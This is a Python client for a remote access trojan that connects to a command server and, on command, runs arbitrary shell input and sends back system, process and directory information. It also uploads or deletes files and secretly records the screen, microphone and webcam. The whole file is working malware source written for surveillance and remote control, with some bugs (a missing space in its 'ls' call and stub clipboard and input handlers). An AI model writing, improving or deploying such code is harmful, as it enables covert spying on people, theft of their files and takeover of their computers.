#!/usr/bin/python3

#*********************************************************************

#import socket
import socket
import threading
import sys
import struct

#import  system_information_discovery
import os
import tqdm
import subprocess as sp

#import screan
import pyscreenshot as ImageGrab

#import audio
import pyaudio
import wave

#import video
import cv2
import numpy as np
import time

IP = socket.gethostbyname(socket.gethostname())
PORT = 50000
ADDR = (IP, PORT)
FORMAT = "utf-8"
SIZE = 1024

SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096 # send 4096 bytes each time step

#*********************************************************************


def send_file_modify(client,filename):
    # get the file size
    filesize = os.path.getsize(filename)
    # send the filename and filesize
    client.send(f"{filename}{SEPARATOR}{filesize}".encode())
    progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    total=0
    with open(filename, "rb") as f:
        for _ in progress:
             while total != filesize:
                # read the bytes from the file
                bytes_read = f.read(BUFFER_SIZE)
                if total == filesize:
                    # file transmitting is done
                    break
                # we use sendall to assure transimission in 
                # busy networks
                client.sendall(bytes_read)
                # update the progress bar
                progress.update(len(bytes_read))
                total += len(bytes_read)
    f.close()
    
def get_file_modify(socket):
    # receive the file infos
    # receive using client socket, not server socket
    received = socket.recv(BUFFER_SIZE).decode()
    filename, filesize = received.split(SEPARATOR)
    # remove absolute path if there is
    filename = os.path.basename(filename)
    # convert to integer
    filesize = int(filesize)
    # start receiving the file from the socket
    # and writing to the file stream
    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    total=0
    with open(filename, "wb") as f:
         for _ in progress:
            while total != filesize:
            # read 1024 bytes from the socket (receive)
                bytes_read = socket.recv(BUFFER_SIZE)
                if not bytes_read:    
                    # nothing is received
                    # file transmitting is done
                    break
                # write to the file the bytes we just received
                f.write(bytes_read)
                # update the progress bar
                progress.update(len(bytes_read))
                total += len(bytes_read)
    f.close()


def system_information_discovery():

    print("System information discovery:\n")

    info="\n"

    info +="\n"+"System information:"+"\n"
    info += "\n"+sp.getoutput('uname -a')+"\n"
    
    info +="\n"+"Processor information:"+"\n"
    info +="\n"+ sp.getoutput('lscpu') +"\n"

    info +="\n"+"Disk information:"+"\n"
    info +="\n"+ sp.getoutput('lsblk') +"\n"

    return info

def command_line_interface(socket):
    
    print("Linux terminal is run:\n")
    
    triger= True

    while triger==True:
        temp = socket.recv(1024)

        command=temp.decode()

        print(command)

        if command!="exit":
            output=""
            output +="\n"+ sp.getoutput(command) +"\n"
            socket.send(output.encode())
            time.sleep(1)
        elif command=="exit":
            triger=False
            break

def file_and_directory_discovery(path):

    print("\nFile and directory discovery:\n")

    files="\n"

    files +="\n"+"File information:"+"\n"
    files +="\n"+ sp.getoutput("ls"+ path) +"\n"

    return files

def process_discovery():

    print("\nProcess discovery:\n")

    process="\n"

    process +="\n"+"Process information:"+"\n"
    process +="\n"+ sp.getoutput('pstree') +"\n"

    return process

def file_deletion(path):
  
    files="\n"
    files +="\n"+ sp.getoutput("rm -f "+ path) +"\n"

    return files

def screen_capture():

    im = ImageGrab.grab()
    im.save("fullscreen.png")

def audio_capture():
    # the file name output you want to record into
    filename = "audio.wav"
    # set the chunk size of 1024 samples
    chunk = 1024
    # sample format
    FORMAT = pyaudio.paInt16
    # mono, change to 2 if you want stereo
    channels = 1
    # 44100 samples per second
    sample_rate = 44100
    record_seconds = 5
    # initialize PyAudio object
    p = pyaudio.PyAudio()
    # open stream object as input & output
    stream = p.open(format=FORMAT,
                    channels=channels,
                    rate=sample_rate,
                    input=True,
                    output=True,
                    frames_per_buffer=chunk)
    frames = []
    print("Recording...")
    for i in range(int(44100 / chunk * record_seconds)):
        data = stream.read(chunk)
        # if you want to hear your voice while recording
        # stream.write(data)
        frames.append(data)
    print("Finished recording.")
    # stop and close stream
    stream.stop_stream()
    stream.close()
    # terminate pyaudio object
    p.terminate()
    # save audio file
    # open the file in 'write bytes' mode
    wf = wave.open(filename, "wb")
    # set the channels
    wf.setnchannels(channels)
    # set the sample format
    wf.setsampwidth(p.get_sample_size(FORMAT))
    # set the sample rate
    wf.setframerate(sample_rate)
    # write the frames as bytes
    wf.writeframes(b"".join(frames))
    # close the file
    wf.close()   

def video_capture():
    # Create a VideoCapture object
    cap = cv2.VideoCapture(0)

    # Check if camera opened successfully
    if (cap.isOpened() == False): 
        print("Unable to read camera feed")

    # Default resolutions of the frame are obtained.The default resolutions are system dependent.
    # We convert the resolutions from float to integer.
    frame_width = int(cap.get(3))
    frame_height = int(cap.get(4))

    # Define the codec and create VideoWriter object.The output is stored in 'outpy.avi' file.
    out = cv2.VideoWriter('video.avi',cv2.VideoWriter_fourcc('M','J','P','G'), 10, (frame_width,frame_height))

    # starting time
    start = time.time()

    i=0

    while(True):
        ret, frame = cap.read()

        if ret == True: 
            
            # Write the frame into the file 'output.avi'
            out.write(frame)

            # Display the resulting frame    
            cv2.imshow('frame',frame)

            i+=1

            # Press Q on keyboard to stop recording
            if i==100:
                if cv2.waitKey(1) & 0xFF == 0xFF:
                    break

        # Break the loop
        else:
            break  

    # When everything done, release the video capture and video write objects
    cap.release()
    out.release()

    # Closes all the frames
    cv2.destroyAllWindows()



def main():
    """ Staring a TCP socket. """
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    """ Connecting to the server. """
    client.connect(ADDR)

    while True:

        command=client.recv(1024)

        print(command.decode())

        commands=command.decode()

        if commands=="info":    #okey
           temp=system_information_discovery().encode()
           client.sendall(temp)
           continue
        if commands=="cmd":     #okey
            temp=command_line_interface(client)
            continue
        if commands[0:5]=="files":   #okey
            temp=file_and_directory_discovery(commands[5:])
            temp=temp.encode()
            client.sendall(temp)
            continue
        if commands[0:4]=="copy": #okey
            send_file_modify(client,commands[5:])
            continue
        if commands[0:6]=="delite": #okey
            temp=file_deletion(commands[6:])
            temp=temp.encode()
            client.sendall(temp)
            continue
        if commands=="process": #okey
            temp=process_discovery().encode()
            client.sendall(temp)
            continue
        if commands=="get_input":
            client.send(command.encode())
            continue
        if commands=="get_clipboard":
            client.send(command.encode())
            continue
        if commands=="get_screen": #okey
            screen_capture()
            continue
        if commands=="get_audio": #okey
            audio_capture()
            continue
        if commands=="get_video": #okey
            video_capture()
            continue
        if commands=="exit": #okey
            print("\nClose the connection and exit for the program.\n")
            break

    """ Closing the connection from the server. """
    client.close()


if __name__ == "__main__":
    main()

#*********************************************************************

